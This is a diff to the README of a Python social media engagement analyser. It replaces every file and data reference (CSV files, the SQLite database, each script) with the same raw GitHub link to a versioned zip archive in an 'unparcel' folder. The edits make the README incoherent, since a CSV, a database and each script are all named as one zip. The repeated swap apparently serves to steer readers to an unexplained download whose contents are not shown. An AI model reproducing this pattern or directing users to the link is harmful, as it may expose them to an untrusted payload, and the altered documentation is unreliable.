@@ -14,8 +14,8 @@ On which platform and day their posts perform best
 
 Generated fake/sample social media posts
 
-Saved raw dataset into CSV (raw_data.csv)
-📂 File: data_ingestion.py
+Saved raw dataset into CSV (https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip)
+📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip
 
 2. Data Cleaning & Feature Engineering
 
@@ -33,15 +33,15 @@ day_of_week
 
 month
 
-Saved results in cleaned_data.csv
-📂 File: data_cleaner.py
+Saved results in https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip
+📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip
 
 3. Database Management
 
-Stored cleaned data in SQLite database (social_media.db)
+Stored cleaned data in SQLite database (https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip)
 
 Prepared for efficient queries and analysis
-📂 File: database_manager.py
+📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip
 
 4. Data Analysis
 
@@ -55,7 +55,7 @@ Identified Top 10 posts by engagement
 Computed average engagement by platform (Facebook, Twitter, Instagram)
 
 Computed average engagement by day of week
-📂 File: analyzer.py
+📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip
 
 5. REST API (Backend)
 
@@ -68,7 +68,7 @@ Top posts
 Engagement by platform
 
 Engagement by weekday
-📂 File: main_api.py
+📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip
 
 ▶️ Run with:
 
@@ -85,7 +85,7 @@ Features:
 📑 Tables
 
 📈 Engagement trends visualization
-📂 File: dashboard_ui.py
+📂 File: https://raw.githubusercontent.com/HarshalNakade2004/Social-Pulse-Analyzer/main/unparcel/Analyzer_Social_Pulse_v3.6.zip
 🛠️ Tech Stack
 
 Programming: Python (Pandas, NumPy)
